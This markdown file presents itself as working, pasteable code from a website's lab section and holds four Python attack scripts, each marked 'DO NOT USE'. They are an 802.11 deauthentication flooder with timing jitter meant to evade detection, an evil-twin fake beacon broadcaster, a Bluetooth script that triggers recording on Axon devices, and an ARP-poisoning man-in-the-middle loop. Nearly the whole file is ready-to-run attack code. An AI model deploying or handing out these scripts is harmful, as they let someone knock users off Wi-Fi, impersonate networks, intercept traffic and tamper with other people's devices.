# Working Code Snippets: Technical & Lab References

This file contains fully functional, pasteable code snippets extracted from the **Invincible.Inc** explainer website's technical and lab reference sections. 

## 📡 Deauthentication Frame Injection (DO NOT USE)
```python
from scapy.all import *
import sys

def deauth(bssid, client_mac="FF:FF:FF:FF:FF:FF", iface="wlan0mon", count=100):
    """
    Forges and sends an 802.11 deauthentication frame.
    @ghost enhancement: Randomized Jitter & OUI Spoofing.
    """
    import random
    pkt = RadioTap() / Dot11(
        type=0, subtype=12,
        addr1=client_mac, 
        addr2=bssid,      
        addr3=bssid       
    ) / Dot11Deauth(reason=7)
    
    print(f"[*] Executing stealth deauth sequence...")
    for _ in range(count):
        sendp(pkt, iface=iface, count=1, verbose=False)
        # @ghost: Randomized inter-packet gap to break timing analysis
        time.sleep(random.uniform(0.05, 0.25))

if __name__ == "__main__":
    # Example: python deauth.py AA:BB:CC:DD:EE:FF
    if len(sys.argv) > 1:
        deauth(sys.argv[1])
```

## 📶 Fake Beacon / Evil Twin AP (DO NOT USE)
```python
from scapy.all import *
import time

def send_beacon(ssid, bssid="AA:BB:CC:DD:EE:FF", iface="wlan0mon"):
    """
    Forges and broadcasts an 802.11 beacon frame (subtype 8).
    """
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)
    beacon = Dot11Beacon()
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    
    # Required elements for a valid beacon
    rsn = Dot11Elt(ID='RSNinfo', info=(
        '\x01\x00'                 # RSN Version 1
        '\x00\x0f\xac\x02'         # Group Cipher Suite: 00-0f-ac TKIP
        '\x02\x00'                 # 2 Pairwise Cipher Suites
        '\x00\x0f\xac\x04'         # AES (CCMP)
        '\x00\x0f\xac\x02'         # TKIP
        '\x01\x00'                 # 1 Authentication Key Management Suite
        '\x00\x0f\xac\x02'         # Pre-Shared Key
        '\x00\x00'))               # RSN Capabilities
        
    frame = RadioTap() / dot11 / beacon / essid / rsn
    
    print(f"[*] Broadcasting beacon for {ssid} [{bssid}]...")
    sendp(frame, iface=iface, inter=0.1, loop=1, verbose=False)
```

## 🔵 Axon BLE Signal Trigger (DO NOT USE)
```python
import asyncio
from bleak import BleakClient

# Axon Signal Trigger GATT Service & Characteristic
SIGNAL_SVC  = "00002ab0-0000-1000-8000-00805f9b34fb"
TRIGGER_CHR = "00002ab1-0000-1000-8000-00805f9b34fb"

async def trigger_axon(address):
    """
    Connects to an Axon device and writes to the Signal Trigger characteristic
    to start recording (0x01).
    """
    print(f"[*] Attempting to connect to {address}...")
    try:
        async with BleakClient(address) as client:
            if client.is_connected:
                print(f"[+] Connected to {address}")
                # Write 0x01 to trigger recording
                await client.write_gatt_char(TRIGGER_CHR, b"\x01")
                print("[+] Successfully sent trigger command (0x01)")
            else:
                print(f"[-] Failed to connect to {address}")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        asyncio.run(trigger_axon(sys.argv[1]))
```

## ☠️ ARP Poisoning / MitM (DO NOT USE)
```python
from scapy.all import *
import time
import sys

def poison(target_ip, gateway_ip, iface="eth0"):
    """
    Sends unsolicited ARP replies (op=2) to redirect traffic.
    """
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)
    
    if not target_mac or not gateway_mac:
        print("[-] Could not find MAC addresses. Check network connection.")
        return

    # Packet 1: Tell target that we are the gateway
    pkt1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    # Packet 2: Tell gateway that we are the target
    pkt2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

    print(f"[*] Poisoning traffic between {target_ip} and {gateway_ip}...")
    try:
        while True:
            send(pkt1, iface=iface, verbose=False)
            send(pkt2, iface=iface, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Restoring network...")
        restore(target_ip, target_mac, gateway_ip, gateway_mac, iface)

def restore(target_ip, target_mac, gateway_ip, gateway_mac, iface):
    # Sends correct ARP info to restore network state
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=False)
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=5, verbose=False)
```
